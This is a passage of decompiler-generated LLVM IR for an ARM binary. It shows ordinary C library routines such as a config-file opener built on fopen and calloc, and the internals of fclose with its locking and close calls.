  store i32 %tmp, i32* @r4, align 4
  %v2_16b6c = icmp eq i32* %arg1, null
  br i1 %v2_16b6c, label %dec_label_pc_16b94, label %dec_label_pc_16b74

dec_label_pc_16b74:                               ; preds = %entry
  %v2_16b74 = load i32, i32* %arg1, align 4
  %v1_16b78 = inttoptr i32 %v2_16b74 to i16*
  %v2_16b78 = call i32 @__GI_fclose(i16* %v1_16b78)
  %v0_16b7c = load i32, i32* @r4, align 4
  %v1_16b7c = add i32 %v0_16b7c, 20
  %v2_16b7c = inttoptr i32 %v1_16b7c to i32*
  %v3_16b7c = load i32, i32* %v2_16b7c, align 4
  %v2_16b80 = icmp eq i32 %v3_16b7c, 0
  br i1 %v2_16b80, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_16b74
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_16b74, %bb
  store i32 93068, i32* @lr, align 4
  %v1_16b88 = xor i1 %v2_16b80, true
  call void @__pseudo_cond_branch(i1 %v1_16b88, i32 ptrtoint (i32* @global_var_1446c.63 to i32))
  %v0_16b8c = load i32, i32* @r4, align 4
  store i32 %v0_16b8c, i32* @r0, align 4
  %v0_16b90 = call i32 @free()
  br label %dec_label_pc_16b94

dec_label_pc_16b94:                               ; preds = %entry, %bb6
  %v1_16b98 = phi i32 [ 0, %entry ], [ %v0_16b90, %bb6 ]
  ret i32 %v1_16b98

; uselistorder directives
  uselistorder label %dec_label_pc_16b94, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16ba8 = load i32, i32* @r4, align 4
  store i32 %v3_16ba8, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -33972), i32* @r1, align 4
  %v0_16bb0 = call i32 @__GI_fopen()
  store i32 %v0_16bb0, i32* %r0.global-to-local, align 4
  store i32 %v0_16bb0, i32* @r4, align 4
  %v2_16bb4 = icmp eq i32 %v0_16bb0, 0
  br i1 %v2_16bb4, label %bb, label %dec_label_pc_16bc0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_16bc0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_16bc8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_16bc8, i32* %r0.global-to-local, align 4
  %v2_16bcc = icmp eq i32 %v2_16bc8, 0
  br i1 %v2_16bcc, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_16bc0
  %v1_16bd0 = load i32, i32* @r4, align 4
  %v3_16bd0 = inttoptr i32 %v2_16bc8 to i32*
  store i32 %v1_16bd0, i32* %v3_16bd0, align 4
  %v1_16bd8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_16bc0, %bb4
  %v1_16bd8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_16bc0 ], [ %v1_16bd8.pre, %bb4 ]
  %v2_16bd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16bd4, i32* @r4, align 4
  ret i32 %v1_16bd8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 36, 34, 35, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16be4 = load i32, i32* @r4, align 4
  store i32 %v3_16be4, i32* %stack_var_-36, align 4
  %v6_16be4 = load i32, i32* @r5, align 4
  %v9_16be4 = load i32, i32* @r6, align 4
  %v12_16be4 = load i32, i32* @r7, align 4
  %v2_16be8 = add i32 %tmp, 52
  %v3_16be8 = inttoptr i32 %v2_16be8 to i32*
  %v4_16be8 = load i32, i32* %v3_16be8, align 4
  store i32 %v4_16be8, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16bf0 = icmp eq i32 %v4_16be8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r8, align 4
  br i1 %v2_16bf0, label %dec_label_pc_16c04, label %dec_label_pc_16c68

dec_label_pc_16c04:                               ; preds = %entry
  %v0_16c04 = call i32 @__aeabi_read_tp()
  store i32 %v0_16c04, i32* %r0.global-to-local, align 4
  %v0_16c08 = load i32, i32* @r5, align 4
  %v1_16c08 = add i32 %v0_16c08, 64
  %v2_16c08 = inttoptr i32 %v1_16c08 to i32*
  %v3_16c08 = load i32, i32* %v2_16c08, align 4
  store i32 %v3_16c08, i32* %r3.global-to-local, align 4
  %v1_16c0c = add i32 %v0_16c04, -1168
  store i32 %v1_16c0c, i32* @r6, align 4
  %v3_16c10 = icmp uge i32 %v3_16c08, %v1_16c0c
  store i1 %v3_16c10, i1* %cpsr_c.global-to-local, align 1
  %v9_16c10 = icmp eq i32 %v3_16c08, %v1_16c0c
  br i1 %v9_16c10, label %dec_label_pc_16c5c, label %dec_label_pc_16c18

dec_label_pc_16c18:                               ; preds = %dec_label_pc_16c04
  %v1_16c18 = add i32 %v0_16c08, 56
  store i32 %v1_16c18, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_16c18, i32* %r2.global-to-local, align 4
  %v0_16c24 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16c24, i32* @r4, align 4
  %v1_16c28115 = inttoptr i32 %v1_16c18 to i32*
  %v2_16c28116 = load i32, i32* %v1_16c28115, align 4
  store i32 %v2_16c28116, i32* %r3.global-to-local, align 4
  %v3_16c2c118 = icmp uge i32 %v2_16c28116, %v0_16c24
  store i1 %v3_16c2c118, i1* %cpsr_c.global-to-local, align 1
  %v9_16c2c124 = icmp eq i32 %v2_16c28116, %v0_16c24
  br i1 %v9_16c2c124, label %dec_label_pc_16c34, label %dec_label_pc_16c4c

dec_label_pc_16c34:                               ; preds = %dec_label_pc_16c18, %dec_label_pc_16c34.dec_label_pc_16c28_crit_edge
  %v0_16c34125 = phi i32 [ %v1_16c2c.pre, %dec_label_pc_16c34.dec_label_pc_16c28_crit_edge ], [ %v0_16c24, %dec_label_pc_16c18 ]
  store i32 %v0_16c34125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16c44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16c44, label %dec_label_pc_16c48, label %dec_label_pc_16c34.dec_label_pc_16c28_crit_edge

dec_label_pc_16c34.dec_label_pc_16c28_crit_edge:  ; preds = %dec_label_pc_16c34
  %v0_16c28.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16c2c.pre = load i32, i32* @r4, align 4
  %v1_16c28 = inttoptr i32 %v0_16c28.pre to i32*
  %v2_16c28 = load i32, i32* %v1_16c28, align 4
  store i32 %v2_16c28, i32* %r3.global-to-local, align 4
  %v3_16c2c = icmp uge i32 %v2_16c28, %v1_16c2c.pre
  store i1 %v3_16c2c, i1* %cpsr_c.global-to-local, align 1
  %v9_16c2c = icmp eq i32 %v2_16c28, %v1_16c2c.pre
  br i1 %v9_16c2c, label %dec_label_pc_16c34, label %dec_label_pc_16c4c

dec_label_pc_16c48:                               ; preds = %dec_label_pc_16c34
  %v0_16c48 = load i32, i32* @r4, align 4
  store i32 %v0_16c48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c4c

dec_label_pc_16c4c:                               ; preds = %dec_label_pc_16c18, %dec_label_pc_16c34.dec_label_pc_16c28_crit_edge, %dec_label_pc_16c48
  %v0_16c4c = phi i32 [ %v0_16c48, %dec_label_pc_16c48 ], [ %v2_16c28116, %dec_label_pc_16c18 ], [ %v2_16c28, %dec_label_pc_16c34.dec_label_pc_16c28_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c4c = icmp eq i32 %v0_16c4c, 0
  br i1 %v2_16c4c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_16c4c
  %v1_16c50 = load i32, i32* @r7, align 4
  store i32 %v1_16c50, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_16c4c, %bb
  %v1_16c54 = xor i1 %v2_16c4c, true
  call void @__pseudo_cond_branch(i1 %v1_16c54, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_16c58 = load i32, i32* @r6, align 4
  %v1_16c58 = load i32, i32* @r5, align 4
  %v2_16c58 = add i32 %v1_16c58, 64
  %v3_16c58 = inttoptr i32 %v2_16c58 to i32*
  store i32 %v0_16c58, i32* %v3_16c58, align 4
  %v0_16c5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16c5c

dec_label_pc_16c5c:                               ; preds = %dec_label_pc_16c04, %bb41
  %v0_16c5c = phi i32 [ %v0_16c08, %dec_label_pc_16c04 ], [ %v0_16c5c.pre, %bb41 ]
  %v1_16c5c = add i32 %v0_16c5c, 60
  %v2_16c5c = inttoptr i32 %v1_16c5c to i32*
  %v3_16c5c = load i32, i32* %v2_16c5c, align 4
  %v1_16c60 = add i32 %v3_16c5c, 1
  store i32 %v1_16c60, i32* %r3.global-to-local, align 4
  store i32 %v1_16c60, i32* %v2_16c5c, align 4
  %v0_16c68.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16c68

dec_label_pc_16c68:                               ; preds = %entry, %dec_label_pc_16c5c
  %v1_16c70 = phi i32 [ %tmp, %entry ], [ %v0_16c68.pre, %dec_label_pc_16c5c ]
  %v1_16c68 = inttoptr i32 %v1_16c70 to i16*
  %v2_16c68 = load i16, i16* %v1_16c68, align 2
  %v3_16c68 = zext i16 %v2_16c68 to i32
  store i32 %v3_16c68, i32* %r3.global-to-local, align 4
  %v1_16c6c = and i32 %v3_16c68, 64
  %v2_16c6c = icmp eq i32 %v1_16c6c, 0
  br i1 %v2_16c6c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_16c68
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_16c68, %bb42
  %storemerge = phi i32 [ %v1_16c70, %bb42 ], [ %v1_16c6c, %dec_label_pc_16c68 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 93304, i32* @lr, align 4
  %v1_16c74 = xor i1 %v2_16c6c, true
  call void @__pseudo_cond_branch(i1 %v1_16c74, i32 ptrtoint (i32* @global_var_17ab8.746 to i32))
  %v0_16c78 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16c78, i32* %fp.global-to-local, align 4
  %v0_16c7c = load i32, i32* @r5, align 4
  %v1_16c7c = add i32 %v0_16c7c, 4
  %v2_16c7c = inttoptr i32 %v1_16c7c to i32*
  %v3_16c7c = load i32, i32* %v2_16c7c, align 4
  store i32 %v3_16c7c, i32* %r0.global-to-local, align 4
  %v1_16c80 = call i32 @__GI___libc_close(i32 %v3_16c7c)
  store i32 %v1_16c80, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16c88 = load i32, i32* @r8, align 4
  %v2_16c88 = add i32 %v0_16c88, 160
  %v3_16c88 = inttoptr i32 %v2_16c88 to i32*
  %v4_16c88 = load i32, i32* %v3_16c88, align 4
  store i32 %v4_16c88, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16c8c = icmp slt i32 %v1_16c80, 0
  br i1 %v1_16c8c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_16c94 = add i32 %v4_16c88, 8
  %v2_16c94 = inttoptr i32 %v1_16c94 to i32*
  %v3_16c94 = load i32, i32* %v2_16c94, align 4
  store i32 %v3_16c94, i32* %r3.global-to-local, align 4
  %v0_16c98 = call i32 @__aeabi_read_tp()
  store i32 %v0_16c98, i32* %r0.global-to-local, align 4
  %v1_16c9c = add i32 %v0_16c98, -1168
  store i32 %v1_16c9c, i32* %sl.global-to-local, align 4
  %v0_16ca0 = load i32, i32* %r3.global-to-local, align 4
  %v3_16ca0 = icmp uge i32 %v0_16ca0, %v1_16c9c
  store i1 %v3_16ca0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ca0 = icmp eq i32 %v0_16ca0, %v1_16c9c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_16ca8 = load i32, i32* @r5, align 4
  %v2_16ca8 = add i32 %v1_16ca8, 4
  %v3_16ca8 = inttoptr i32 %v2_16ca8 to i32*
  store i32 -1, i32* %v3_16ca8, align 4
  br i1 %v9_16ca0, label %dec_label_pc_16cf0, label %dec_label_pc_16cb0

dec_label_pc_16cb0:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_16cb4 = load i32, i32* @r7, align 4
  store i32 %v0_16cb4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_16cbc108 = inttoptr i32 %v0_16cb4 to i32*
  %v2_16cbc109 = load i32, i32* %v1_16cbc108, align 4
  store i32 %v2_16cbc109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16cc0111 = icmp eq i32 %v2_16cbc109, 0
  br i1 %v9_16cc0111, label %dec_label_pc_16cc8, label %dec_label_pc_16ce0

dec_label_pc_16cc8:                               ; preds = %dec_label_pc_16cb0, %dec_label_pc_16cc8.dec_label_pc_16cbc_crit_edge
  %v0_16cc8112 = phi i32 [ %v1_16cc0.pre, %dec_label_pc_16cc8.dec_label_pc_16cbc_crit_edge ], [ 0, %dec_label_pc_16cb0 ]
  store i32 %v0_16cc8112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16cd8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16cd8, label %dec_label_pc_16cdc, label %dec_label_pc_16cc8.dec_label_pc_16cbc_crit_edge

dec_label_pc_16cc8.dec_label_pc_16cbc_crit_edge:  ; preds = %dec_label_pc_16cc8
  %v0_16cbc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16cc0.pre = load i32, i32* @r4, align 4
  %v1_16cbc = inttoptr i32 %v0_16cbc.pre to i32*
  %v2_16cbc = load i32, i32* %v1_16cbc, align 4
  store i32 %v2_16cbc, i32* %r3.global-to-local, align 4
  %v3_16cc0 = icmp uge i32 %v2_16cbc, %v1_16cc0.pre
  store i1 %v3_16cc0, i1* %cpsr_c.global-to-local, align 1
  %v9_16cc0 = icmp eq i32 %v2_16cbc, %v1_16cc0.pre
  br i1 %v9_16cc0, label %dec_label_pc_16cc8, label %dec_label_pc_16ce0

dec_label_pc_16cdc:                               ; preds = %dec_label_pc_16cc8
  %v0_16cdc = load i32, i32* @r4, align 4
  store i32 %v0_16cdc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ce0

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16cb0, %dec_label_pc_16cc8.dec_label_pc_16cbc_crit_edge, %dec_label_pc_16cdc
  %v0_16ce0 = phi i32 [ %v0_16cdc, %dec_label_pc_16cdc ], [ %v2_16cbc109, %dec_label_pc_16cb0 ], [ %v2_16cbc, %dec_label_pc_16cc8.dec_label_pc_16cbc_crit_edge ]
  %v1_16ce0 = phi i32 [ %v0_16cdc, %dec_label_pc_16cdc ], [ 0, %dec_label_pc_16cb0 ], [ %v1_16cc0.pre, %dec_label_pc_16cc8.dec_label_pc_16cbc_crit_edge ]
  %v3_16ce0 = icmp uge i32 %v0_16ce0, %v1_16ce0
  store i1 %v3_16ce0, i1* %cpsr_c.global-to-local, align 1
  %v9_16ce0 = icmp eq i32 %v0_16ce0, %v1_16ce0
  br i1 %v9_16ce0, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_16ce0
  %v1_16ce4 = load i32, i32* @r7, align 4
  store i32 %v1_16ce4, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16ce0, %bb46
  %v1_16ce8 = xor i1 %v9_16ce0, true
  call void @__pseudo_cond_branch(i1 %v1_16ce8, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_16cec = load i32, i32* %sl.global-to-local, align 4
  %v1_16cec = load i32, i32* @r7, align 4
  %v2_16cec = add i32 %v1_16cec, 8
  %v3_16cec = inttoptr i32 %v2_16cec to i32*
  store i32 %v0_16cec, i32* %v3_16cec, align 4
  br label %dec_label_pc_16cf0

dec_label_pc_16cf0:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16cf4 = load i32, i32* @r8, align 4
  %v2_16cf4 = add i32 %v0_16cf4, 160
  %v3_16cf4 = inttoptr i32 %v2_16cf4 to i32*
  %v4_16cf4 = load i32, i32* %v3_16cf4, align 4
  store i32 %v4_16cf4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16cfc = add i32 %v0_16cf4, 12
  %v3_16cfc = inttoptr i32 %v2_16cfc to i32*
  %v4_16cfc = load i32, i32* %v3_16cfc, align 4
  store i32 %v4_16cfc, i32* %r2.global-to-local, align 4
  %v1_16d00 = add i32 %v4_16cf4, 4
  %v2_16d00 = inttoptr i32 %v1_16d00 to i32*
  %v3_16d00 = load i32, i32* %v2_16d00, align 4
  store i32 %v3_16d00, i32* %r1.global-to-local, align 4
  %v1_16d04 = inttoptr i32 %v4_16cfc to i32*
  %v2_16d04 = load i32, i32* %v1_16d04, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d08 = icmp eq i32 %v3_16d00, 0
  %v1_16d0c = add i32 %v2_16d04, 1
  store i32 %v1_16d0c, i32* %r3.global-to-local, align 4
  store i32 %v1_16d0c, i32* %v1_16d04, align 4
  br i1 %v2_16d08, label %dec_label_pc_16d18, label %dec_label_pc_16d78

dec_label_pc_16d18:                               ; preds = %dec_label_pc_16cf0
  %v0_16d18 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d18 = load i32, i32* %r0.global-to-local, align 4
  %v2_16d18 = add i32 %v1_16d18, 8
  %v3_16d18 = inttoptr i32 %v2_16d18 to i32*
  store i32 %v0_16d18, i32* %v3_16d18, align 4
  %v0_16d1c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16d1c, i32* @r7, align 4
  br label %dec_label_pc_16d20

dec_label_pc_16d20:                               ; preds = %dec_label_pc_16d50.dec_label_pc_16d20_crit_edge, %dec_label_pc_16d18
  %v0_16d20 = phi i32 [ %v0_16d20.pre, %dec_label_pc_16d50.dec_label_pc_16d20_crit_edge ], [ %v0_16d1c, %dec_label_pc_16d18 ]
  %v1_16d20 = inttoptr i32 %v0_16d20 to i32*
  %v2_16d20 = load i32, i32* %v1_16d20, align 4
  store i32 %v2_16d20, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16d20, i32* %r2.global-to-local, align 4
  %v2_16d2c96 = load i32, i32* %v1_16d20, align 4
  store i32 %v2_16d2c96, i32* %r3.global-to-local, align 4
  %v3_16d3098 = icmp uge i32 %v2_16d2c96, %v2_16d20
  store i1 %v3_16d3098, i1* %cpsr_c.global-to-local, align 1
  %v9_16d30104 = icmp eq i32 %v2_16d2c96, %v2_16d20
  br i1 %v9_16d30104, label %dec_label_pc_16d38, label %dec_label_pc_16d50

dec_label_pc_16d38:                               ; preds = %dec_label_pc_16d20, %dec_label_pc_16d38.dec_label_pc_16d2c_crit_edge
  %v0_16d38105 = phi i32 [ %v1_16d30.pre, %dec_label_pc_16d38.dec_label_pc_16d2c_crit_edge ], [ %v2_16d20, %dec_label_pc_16d20 ]
  store i32 %v0_16d38105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16d48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16d48, label %dec_label_pc_16d4c, label %dec_label_pc_16d38.dec_label_pc_16d2c_crit_edge

dec_label_pc_16d38.dec_label_pc_16d2c_crit_edge:  ; preds = %dec_label_pc_16d38
  %v0_16d2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16d30.pre = load i32, i32* @r4, align 4
  %v1_16d2c = inttoptr i32 %v0_16d2c.pre to i32*
  %v2_16d2c = load i32, i32* %v1_16d2c, align 4
  store i32 %v2_16d2c, i32* %r3.global-to-local, align 4
  %v3_16d30 = icmp uge i32 %v2_16d2c, %v1_16d30.pre
  store i1 %v3_16d30, i1* %cpsr_c.global-to-local, align 1
  %v9_16d30 = icmp eq i32 %v2_16d2c, %v1_16d30.pre
  br i1 %v9_16d30, label %dec_label_pc_16d38, label %dec_label_pc_16d50

dec_label_pc_16d4c:                               ; preds = %dec_label_pc_16d38
  %v0_16d4c = load i32, i32* @r4, align 4
  store i32 %v0_16d4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d50

dec_label_pc_16d50:                               ; preds = %dec_label_pc_16d20, %dec_label_pc_16d38.dec_label_pc_16d2c_crit_edge, %dec_label_pc_16d4c
  %v0_16d58 = phi i32 [ %v0_16d4c, %dec_label_pc_16d4c ], [ %v2_16d2c96, %dec_label_pc_16d20 ], [ %v2_16d2c, %dec_label_pc_16d38.dec_label_pc_16d2c_crit_edge ]
  %v1_16d50 = phi i32 [ %v0_16d4c, %dec_label_pc_16d4c ], [ %v2_16d20, %dec_label_pc_16d20 ], [ %v1_16d30.pre, %dec_label_pc_16d38.dec_label_pc_16d2c_crit_edge ]
  %v3_16d50 = icmp uge i32 %v0_16d58, %v1_16d50
  store i1 %v3_16d50, i1* %cpsr_c.global-to-local, align 1
  %v9_16d50 = icmp eq i32 %v0_16d58, %v1_16d50
  br i1 %v9_16d50, label %dec_label_pc_16d58, label %dec_label_pc_16d50.dec_label_pc_16d20_crit_edge

dec_label_pc_16d50.dec_label_pc_16d20_crit_edge:  ; preds = %dec_label_pc_16d50
  %v0_16d20.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16d20

dec_label_pc_16d58:                               ; preds = %dec_label_pc_16d50
  %v2_16d58 = icmp ne i32 %v1_16d50, 0
  store i1 %v2_16d58, i1* %cpsr_c.global-to-local, align 1
  %v7_16d5c = icmp slt i32 %v1_16d50, 2
  br i1 %v7_16d5c, label %dec_label_pc_16d78, label %dec_label_pc_16d60

dec_label_pc_16d60:                               ; preds = %dec_label_pc_16d58
  %v0_16d60 = load i32, i32* @r7, align 4
  store i32 %v0_16d60, i32* %r0.global-to-local, align 4
  %v0_16d64 = load i32, i32* %r1.global-to-local, align 4
  %v1_16d64 = add i32 %v0_16d64, 129
  store i32 %v1_16d64, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16d78

dec_label_pc_16d78:                               ; preds = %dec_label_pc_16cf0, %dec_label_pc_16d60, %dec_label_pc_16d58
  %v0_16d78 = load i32, i32* @r5, align 4
  %v1_16d78 = inttoptr i32 %v0_16d78 to i16*
  %v2_16d78 = load i16, i16* %v1_16d78, align 2
  %v3_16d78 = zext i16 %v2_16d78 to i32
  %v1_16d7c = and i32 %v3_16d78, 24576
  %v1_16d80 = or i32 %v1_16d7c, 48
  store i32 %v1_16d80, i32* %r3.global-to-local, align 4
  %v0_16d84 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d84 = icmp eq i32 %v0_16d84, 0
  %v1_16d88 = trunc i32 %v1_16d80 to i16
  store i16 %v1_16d88, i16* %v1_16d78, align 2
  br i1 %v2_16d84, label %dec_label_pc_16d90, label %dec_label_pc_16e04

dec_label_pc_16d90:                               ; preds = %dec_label_pc_16d78
  %v0_16d90 = load i32, i32* @r5, align 4
  %v1_16d90 = add i32 %v0_16d90, 60
  %v2_16d90 = inttoptr i32 %v1_16d90 to i32*
  %v3_16d90 = load i32, i32* %v2_16d90, align 4
  %v1_16d94 = add i32 %v3_16d90, -1
  store i32 %v1_16d94, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16d98 = icmp eq i32 %v1_16d94, 0
  store i32 %v1_16d94, i32* %v2_16d90, align 4
  br i1 %v2_16d98, label %dec_label_pc_16da4, label %dec_label_pc_16e04

dec_label_pc_16da4:                               ; preds = %dec_label_pc_16d90
  %v0_16da4 = load i32, i32* %r3.global-to-local, align 4
  %v1_16da4 = load i32, i32* @r5, align 4
  %v2_16da4 = add i32 %v1_16da4, 64
  %v3_16da4 = inttoptr i32 %v2_16da4 to i32*
  store i32 %v0_16da4, i32* %v3_16da4, align 4
  %v0_16da8 = load i32, i32* @r5, align 4
  %v1_16da8 = add i32 %v0_16da8, 56
  store i32 %v1_16da8, i32* @r6, align 4
  br label %dec_label_pc_16dac

dec_label_pc_16dac:                               ; preds = %dec_label_pc_16ddc.dec_label_pc_16dac_crit_edge, %dec_label_pc_16da4
  %v0_16db4 = phi i32 [ %v0_16db4.pre, %dec_label_pc_16ddc.dec_label_pc_16dac_crit_edge ], [ %v1_16da8, %dec_label_pc_16da4 ]
  %v0_16dac = phi i32 [ %v0_16dac.pre, %dec_label_pc_16ddc.dec_label_pc_16dac_crit_edge ], [ %v0_16da8, %dec_label_pc_16da4 ]
  %v1_16dac = add i32 %v0_16dac, 56
  %v2_16dac = inttoptr i32 %v1_16dac to i32*
  %v3_16dac = load i32, i32* %v2_16dac, align 4
  store i32 %v3_16dac, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16db4, i32* %r2.global-to-local, align 4
  %v1_16db882 = inttoptr i32 %v0_16db4 to i32*
  %v2_16db883 = load i32, i32* %v1_16db882, align 4
  store i32 %v2_16db883, i32* %r3.global-to-local, align 4
  %v3_16dbc85 = icmp uge i32 %v2_16db883, %v3_16dac
  store i1 %v3_16dbc85, i1* %cpsr_c.global-to-local, align 1
  %v9_16dbc91 = icmp eq i32 %v2_16db883, %v3_16dac
  br i1 %v9_16dbc91, label %dec_label_pc_16dc4, label %dec_label_pc_16ddc

dec_label_pc_16dc4:                               ; preds = %dec_label_pc_16dac, %dec_label_pc_16dc4.dec_label_pc_16db8_crit_edge
  %v0_16dc492 = phi i32 [ %v1_16dbc.pre, %dec_label_pc_16dc4.dec_label_pc_16db8_crit_edge ], [ %v3_16dac, %dec_label_pc_16dac ]
  store i32 %v0_16dc492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16dd4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16dd4, label %dec_label_pc_16dd8, label %dec_label_pc_16dc4.dec_label_pc_16db8_crit_edge

dec_label_pc_16dc4.dec_label_pc_16db8_crit_edge:  ; preds = %dec_label_pc_16dc4
  %v0_16db8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16dbc.pre = load i32, i32* @r4, align 4
  %v1_16db8 = inttoptr i32 %v0_16db8.pre to i32*
  %v2_16db8 = load i32, i32* %v1_16db8, align 4
  store i32 %v2_16db8, i32* %r3.global-to-local, align 4
  %v3_16dbc = icmp uge i32 %v2_16db8, %v1_16dbc.pre
  store i1 %v3_16dbc, i1* %cpsr_c.global-to-local, align 1
  %v9_16dbc = icmp eq i32 %v2_16db8, %v1_16dbc.pre
  br i1 %v9_16dbc, label %dec_label_pc_16dc4, label %dec_label_pc_16ddc

dec_label_pc_16dd8:                               ; preds = %dec_label_pc_16dc4
  %v0_16dd8 = load i32, i32* @r4, align 4
  store i32 %v0_16dd8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ddc

dec_label_pc_16ddc:                               ; preds = %dec_label_pc_16dac, %dec_label_pc_16dc4.dec_label_pc_16db8_crit_edge, %dec_label_pc_16dd8
  %v0_16de4 = phi i32 [ %v0_16dd8, %dec_label_pc_16dd8 ], [ %v2_16db883, %dec_label_pc_16dac ], [ %v2_16db8, %dec_label_pc_16dc4.dec_label_pc_16db8_crit_edge ]
  %v1_16ddc = phi i32 [ %v0_16dd8, %dec_label_pc_16dd8 ], [ %v3_16dac, %dec_label_pc_16dac ], [ %v1_16dbc.pre, %dec_label_pc_16dc4.dec_label_pc_16db8_crit_edge ]
  %v3_16ddc = icmp uge i32 %v0_16de4, %v1_16ddc
  store i1 %v3_16ddc, i1* %cpsr_c.global-to-local, align 1
  %v9_16ddc = icmp eq i32 %v0_16de4, %v1_16ddc
  br i1 %v9_16ddc, label %dec_label_pc_16de4, label %dec_label_pc_16ddc.dec_label_pc_16dac_crit_edge

dec_label_pc_16ddc.dec_label_pc_16dac_crit_edge:  ; preds = %dec_label_pc_16ddc
  %v0_16dac.pre = load i32, i32* @r5, align 4
  %v0_16db4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16dac

